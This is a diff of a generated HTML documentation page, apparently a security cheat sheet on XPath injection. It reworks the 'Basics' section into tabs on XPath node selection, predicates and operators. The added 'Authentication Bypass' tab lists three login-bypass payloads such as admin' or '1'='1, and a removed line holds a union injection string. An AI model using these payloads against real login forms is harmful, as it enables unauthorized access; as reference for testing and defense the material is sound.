@@ -4074,21 +4074,10 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#basic" class="md-nav__link">
+  <a href="#basics" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Basic
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#merging" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Merging
+        Basics
       
     </span>
   </a>
@@ -4554,21 +4543,10 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#basic" class="md-nav__link">
+  <a href="#basics" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Basic
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#merging" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Merging
+        Basics
       
     </span>
   </a>
@@ -4694,25 +4672,152 @@
 <li>It does not implement any access control, so if you find an injection point it's likely possible to get the whole document.</li>
 </ul>
 <h2 id="syntax">Syntax</h2>
-<h3 id="basic">Basic</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>admin&#39; or &quot;a&quot;=&quot;a
+<h3 id="basics">Basics</h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Nodes</label><label for="__tabbed_1_2">Predicates</label><label for="__tabbed_1_3">Authentication Bypass</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<dl>
+<dt>Select all <code>module</code> child nodes of the context node</dt>
+<dd><code>module</code></dd>
+<dt>Select the document root node</dt>
+<dd><code>/</code></dd>
+<dt>Select descendant nodes of the context node</dt>
+<dd><code>//</code></dd>
+<dt>Select the context node</dt>
+<dd><code>.</code></dd>
+<dt>Select the parent of the context node</dt>
+<dd><code>..</code></dd>
+<dt>Select the <code>whatever</code> attribute node of the context node</dt>
+<dd><code>@whatever</code></dd>
+<dt>Select all text node child nodes of the context node</dt>
+<dd><code>text()</code></dd>
+</dl>
+</div>
+<div class="tabbed-block">
+<p>Select the first <code>name</code> child node of the <code>cats</code> node</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>/cats/name[1]
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>/cats/name[position()=1]
 </span></code></pre></div>
-<div class="language-text highlight"><span class="filename">Read the name of any node with name</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>name(/db) = &#39;db&#39;
+<p>Select the last name child node of the <code>cats</code> node</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>/cats/name[last()]
 </span></code></pre></div>
-<ul class="task-list">
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> We can use <code>/*</code> to match any child</p>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> You can use the position of the node in it's parent as a filter : </p>
-<ul>
-<li><code>/db/users/user[position() = 42</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="merging">Merging</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>a&quot;] | / | /a[b=&quot;
+<p>Select the first two <code>name</code> child nodes of the <code>cats</code> node</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>/cats/name[position()&lt;3]
 </span></code></pre></div>
+<p>Select the title of all courses where the tier element node equals 2</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>//course[tier=2]/title/text()
+</span></code></pre></div>
+<p>Select the <code>title</code> of all courses where the <code>author</code> element node has a <code>co-author</code> attribute node</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>//course/author[@co-author]/../title
+</span></code></pre></div>
+<p>Select all courses where the <code>tier</code> element node has a difficulty attribute node set to medium</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>//course/tier[@difficulty=&quot;medium&quot;]/..
+</span></code></pre></div>
+<p><strong>Predicate Operands</strong></p>
+<table>
+<thead>
+<tr>
+<th>Operand</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>+</code></td>
+<td>Addition</td>
+</tr>
+<tr>
+<td><code>-</code></td>
+<td>Subtraction</td>
+</tr>
+<tr>
+<td><code>*</code></td>
+<td>Multiplication</td>
+</tr>
+<tr>
+<td><code>div</code></td>
+<td>Division</td>
+</tr>
+<tr>
+<td><code>=</code></td>
+<td>Equal</td>
+</tr>
+<tr>
+<td><code>!=</code></td>
+<td>Not Equal</td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td>Less than</td>
+</tr>
+<tr>
+<td><code>&lt;=</code></td>
+<td>Less than or Equal</td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>Greater than</td>
+</tr>
+<tr>
+<td><code>&gt;=</code></td>
+<td>Greater than or Equal</td>
+</tr>
+<tr>
+<td><code>or</code></td>
+<td>Logical Or</td>
+</tr>
+<tr>
+<td><code>and</code></td>
+<td>Logical And</td>
+</tr>
+<tr>
+<td><code>mod</code></td>
+<td>Modulus</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Wildcards</strong></p>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>node()</code></td>
+<td>Matches any node</td>
+</tr>
+<tr>
+<td><code>*</code></td>
+<td>Matches any <code>element</code> node</td>
+</tr>
+<tr>
+<td><code>@*</code></td>
+<td>Matches any <code>attribute</code> node</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Union</strong></p>
+<p>Select the title of all modules in tiers 2 and 3</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>//module[tier=2]/title/text() | //module[tier=3]/title/text()
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<p>Bypass with known username</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>admin&#39; or &#39;1&#39;=&#39;1
+</span></code></pre></div>
+<p>Bypass auth by position</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&#39; or position()=1 or &#39;
+</span></code></pre></div>
+<p>Bypass auth by substring</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>&#39; or contains(.,&#39;admin&#39;) or &#39;
+</span></code></pre></div>
+</div>
+</div>
+</div>
 
 
   <nav class="md-tags" >
